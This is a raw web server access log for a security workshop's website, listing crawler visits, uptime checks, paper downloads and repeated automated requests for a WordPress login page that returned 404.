77.75.77.101 - - [06/May/2018:16:13:49 -0400] "GET /2008/tmp/ HTTP/1.1" 403 4033 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
54.173.254.129 - - [06/May/2018:16:14:09 -0400] "GET /papers/2007/nspw2007-solworth.pdf HTTP/1.1" 200 384610 "-" "python-requests/2.18.4"
216.244.66.247 - - [06/May/2018:16:14:44 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [06/May/2018:16:15:50 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
191.6.29.21 - - [06/May/2018:16:17:12 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
191.6.29.21 - - [06/May/2018:16:17:14 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.215 - - [06/May/2018:16:20:07 -0400] "GET /current/ HTTP/1.1" 200 6906 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [06/May/2018:16:20:49 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.219 - - [06/May/2018:16:21:16 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 200 159425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
103.17.156.149 - - [06/May/2018:16:21:37 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.17.156.149 - - [06/May/2018:16:21:38 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
93.35.164.162 - - [06/May/2018:16:23:24 -0400] "GET /wp-login.php HTTP/1.1" 404 8034 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
93.35.164.162 - - [06/May/2018:16:23:25 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
45.124.59.18 - - [06/May/2018:16:23:41 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
168.232.6.46 - - [06/May/2018:16:24:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
168.232.6.46 - - [06/May/2018:16:24:15 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
207.46.13.179 - - [06/May/2018:16:24:07 -0400] "GET /papers/2000/nspw2000-mcdermott.pdf HTTP/1.1" 200 378526 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
87.58.107.31 - - [06/May/2018:16:24:53 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
87.58.107.31 - - [06/May/2018:16:24:54 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [06/May/2018:16:25:49 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
223.223.143.65 - - [06/May/2018:16:31:05 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
223.223.143.65 - - [06/May/2018:16:31:06 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [06/May/2018:16:33:47 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
190.192.194.85 - - [06/May/2018:16:34:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
190.192.194.85 - - [06/May/2018:16:34:47 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
84.108.92.81 - - [06/May/2018:16:35:29 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
84.108.92.81 - - [06/May/2018:16:35:31 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
64.62.252.163 - - [06/May/2018:16:36:27 -0400] "GET /robots.txt HTTP/1.1" 200 4444 "-" "The Knowledge AI"
69.162.124.227 - - [06/May/2018:16:38:46 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
158.181.41.10 - - [06/May/2018:16:39:26 -0400] "GET /wp-login.php HTTP/1.1" 404 7782 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
158.181.41.10 - - [06/May/2018:16:39:29 -0400] "GET / HTTP/1.1" 200 8266 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [06/May/2018:16:45:52 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.75.78.165 - - [06/May/2018:16:45:53 -0400] "GET /robots.txt HTTP/1.1" 200 4601 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.78.165 - - [06/May/2018:16:46:04 -0400] "GET /2005/submission.content HTTP/1.1" 200 5182 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
66.249.64.215 - - [06/May/2018:16:46:08 -0400] "GET /current/program.shtml HTTP/1.1" 404 8016 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.75.78.165 - - [06/May/2018:16:46:15 -0400] "GET /cfp/nspw2016-cfp.pdf HTTP/1.1" 200 83903 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.88.47.40 - - [06/May/2018:16:45:57 -0400] "GET /papers/2000/nspw2000-mcdermott.pdf HTTP/1.1" 200 378080 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.75.78.165 - - [06/May/2018:16:46:26 -0400] "GET /2009/dates.shtml HTTP/1.1" 200 5157 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.78.165 - - [06/May/2018:16:46:36 -0400] "GET /robots.txt HTTP/1.1" 200 4585 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.78.165 - - [06/May/2018:16:46:47 -0400] "GET /2017/program HTTP/1.1" 200 7419 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.78.165 - - [06/May/2018:16:46:57 -0400] "GET /2000/pc.html HTTP/1.1" 200 5318 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.88.47.40 - - [06/May/2018:16:46:18 -0400] "GET /2009/proceedings/1997/nspw1997-essin.pdf HTTP/1.1" 200 1203210 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.64.217 - - [06/May/2018:16:47:55 -0400] "GET / HTTP/1.1" 200 6607 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
177.94.156.245 - - [06/May/2018:16:48:30 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
177.94.156.245 - - [06/May/2018:16:48:31 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [06/May/2018:16:47:21 -0400] "GET /2009/proceedings/1997/nspw1997-kienzle.pdf HTTP/1.1" 200 1507632 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
216.244.66.247 - - [06/May/2018:16:48:49 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
77.88.47.40 - - [06/May/2018:16:50:15 -0400] "GET /2009/proceedings/1998/nspw1998-chang.pdf HTTP/1.1" 200 679155 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.135 - - [06/May/2018:16:52:04 -0400] "GET /papers/2012/docs/welcome1.pdf HTTP/1.1" 200 90277 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [06/May/2018:16:54:06 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [06/May/2018:16:54:47 -0400] "GET /2008/program.shtml HTTP/1.1" 200 4993 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [06/May/2018:16:59:05 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
91.119.198.40 - - [06/May/2018:16:59:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
91.119.198.40 - - [06/May/2018:16:59:47 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.215 - - [06/May/2018:17:01:16 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712024 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [06/May/2018:17:03:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
85.139.113.191 - - [06/May/2018:17:04:41 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
85.139.113.191 - - [06/May/2018:17:04:42 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
137.112.228.195 - - [06/May/2018:17:07:13 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502385 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
137.112.228.195 - - [06/May/2018:17:07:14 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [06/May/2018:17:07:14 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [06/May/2018:17:07:14 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [06/May/2018:17:07:14 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [06/May/2018:17:07:14 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [06/May/2018:17:07:14 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [06/May/2018:17:07:14 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [06/May/2018:17:07:14 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [06/May/2018:17:07:14 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.195 - - [06/May/2018:17:07:14 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
199.16.157.181 - - [06/May/2018:17:07:40 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
199.16.157.183 - - [06/May/2018:17:07:40 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
69.162.124.227 - - [06/May/2018:17:08:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
69.162.124.227 - - [06/May/2018:17:13:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
35.226.23.240 - - [06/May/2018:17:13:53 -0400] "GET /robots.txt HTTP/1.1" 200 4480 "-" "ltx71 - (http://ltx71.com/)"
66.249.64.219 - - [06/May/2018:17:14:36 -0400] "GET /2006/ieee.clo HTTP/1.1" 200 13249 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [06/May/2018:17:14:33 -0400] "GET /2009/proceedings/1994/nspw1994-hamilton.pdf HTTP/1.1" 200 632559 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
189.92.239.5 - - [06/May/2018:17:15:40 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
189.92.239.5 - - [06/May/2018:17:15:40 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.133.30.176 - - [06/May/2018:17:15:43 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [06/May/2018:17:15:07 -0400] "GET /2009/proceedings/1994/nspw1994-ovchinnikov.pdf HTTP/1.1" 200 792891 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
197.133.30.176 - - [06/May/2018:17:15:46 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [06/May/2018:17:15:46 -0400] "GET /2009/proceedings/2005/nspw2005-taylor-pos.pdf HTTP/1.1" 200 460877 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
128.227.137.90 - - [06/May/2018:17:18:04 -0400] "GET /papers/2004/nspw2004-sadeghi.pdf HTTP/1.1" 200 226138 "https://scholar.google.com/scholar?hl=en&as_sdt=0%2C10&q=ahmad+reza+sadeghi&btnG=&oq=ahmad-reza+" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
128.227.137.90 - - [06/May/2018:17:18:05 -0400] "GET /favicon.ico HTTP/1.1" 404 3914 "https://www.nspw.org/papers/2004/nspw2004-sadeghi.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15"
164.163.158.65 - - [06/May/2018:17:20:02 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
164.163.158.65 - - [06/May/2018:17:20:03 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
216.244.66.200 - - [06/May/2018:17:20:49 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [06/May/2018:17:22:04 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.17 - - [06/May/2018:17:23:27 -0400] "GET /2006/oc.shtml HTTP/1.1" 200 5283 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [06/May/2018:17:27:04 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.200 - - [06/May/2018:17:27:30 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.64.219 - - [06/May/2018:17:27:56 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
197.52.241.204 - - [06/May/2018:17:30:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.52.241.204 - - [06/May/2018:17:30:48 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [06/May/2018:17:32:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
69.162.124.227 - - [06/May/2018:17:37:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.75.78.169 - - [06/May/2018:17:38:32 -0400] "GET /robots.txt HTTP/1.1" 200 4601 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.78.169 - - [06/May/2018:17:38:42 -0400] "GET /2003/NSPWtrans.gif HTTP/1.1" 200 12434 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.78.169 - - [06/May/2018:17:38:53 -0400] "GET /2003/dates.content HTTP/1.1" 200 4383 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.78.169 - - [06/May/2018:17:39:04 -0400] "GET /1999/cfp.txt HTTP/1.1" 200 6633 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.78.169 - - [06/May/2018:17:39:14 -0400] "GET /papers/2012/ HTTP/1.1" 200 6425 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.75.78.169 - - [06/May/2018:17:39:24 -0400] "GET /2010/papers HTTP/1.1" 200 7391 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
77.88.47.40 - - [06/May/2018:17:39:29 -0400] "GET /2005/cfp/CFP.log HTTP/1.1" 200 9633 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.75.78.169 - - [06/May/2018:17:39:35 -0400] "GET /2013 HTTP/1.1" 200 6893 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
220.181.125.142 - - [06/May/2018:17:40:43 -0400] "GET /node/5 HTTP/1.1" 200 6446 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
220.181.125.142 - - [06/May/2018:17:40:54 -0400] "GET / HTTP/1.1" 200 6669 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
220.181.125.142 - - [06/May/2018:17:41:04 -0400] "GET /2010/submissions HTTP/1.1" 200 6981 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
77.88.47.40 - - [06/May/2018:17:40:53 -0400] "GET /papers/2009/nspw2009-church.pdf HTTP/1.1" 200 283672 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
220.181.125.142 - - [06/May/2018:17:41:14 -0400] "GET /2010/pc HTTP/1.1" 200 6687 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
66.249.64.219 - - [06/May/2018:17:41:15 -0400] "GET /2001/1999 HTTP/1.1" 404 7997 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [06/May/2018:17:41:09 -0400] "GET /2009/proceedings/2007/nspw2007-nali.pdf HTTP/1.1" 200 875239 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [06/May/2018:17:42:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
54.70.40.11 - - [06/May/2018:17:43:56 -0400] "GET /robots.txt HTTP/1.1" 200 4282 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
220.181.125.142 - - [06/May/2018:17:46:30 -0400] "GET /papers/2009/nspw2009-verendel.pdf HTTP/1.1" 304 3665 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
220.181.125.142 - - [06/May/2018:17:46:46 -0400] "GET /papers/2011/nspw2011-hamacher.pdf HTTP/1.1" 304 3665 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
185.234.216.28 - - [06/May/2018:17:46:48 -0400] "HEAD / HTTP/1.1" 200 3911 "https://www.nspw.org/" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28"
220.181.125.142 - - [06/May/2018:17:47:02 -0400] "GET /papers/1997/nspw1997-mambo.pdf HTTP/1.1" 304 3666 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
69.162.124.227 - - [06/May/2018:17:47:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [06/May/2018:17:48:10 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
216.244.66.236 - - [06/May/2018:17:50:49 -0400] "GET /2009/proceedings/1993/nspw1993-rooker.pdf HTTP/1.1" 200 462655 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [06/May/2018:17:52:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.217 - - [06/May/2018:17:54:35 -0400] "GET /papers/2001/nspw2001-blakley.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
189.115.120.167 - - [06/May/2018:17:54:40 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
189.115.120.167 - - [06/May/2018:17:54:42 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
129.7.104.55 - - [06/May/2018:17:56:25 -0400] "GET /2009/proceedings/2002/nspw2002-bhattacharyya.pdf HTTP/1.1" 200 795337 "https://scholar.google.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
129.7.104.55 - - [06/May/2018:17:56:25 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/2009/proceedings/2002/nspw2002-bhattacharyya.pdf" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
139.47.111.126 - - [06/May/2018:17:56:26 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
139.47.111.126 - - [06/May/2018:17:56:26 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
129.7.104.55 - - [06/May/2018:17:56:45 -0400] "-" 408 3408 "-" "-"
69.162.124.227 - - [06/May/2018:17:57:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [06/May/2018:17:58:01 -0400] "GET /robots.txt HTTP/1.1" 200 5979 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [06/May/2018:17:58:04 -0400] "GET /papers/2013/nspw2013-egelman.pdf HTTP/1.1" 200 441351 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
27.130.225.216 - - [06/May/2018:17:59:58 -0400] "GET /wp-login.php HTTP/1.1" 404 8034 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
27.130.225.216 - - [06/May/2018:17:59:59 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [06/May/2018:18:02:03 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
199.16.157.183 - - [06/May/2018:18:04:03 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
109.60.100.237 - - [06/May/2018:18:04:51 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.60.100.237 - - [06/May/2018:18:04:51 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
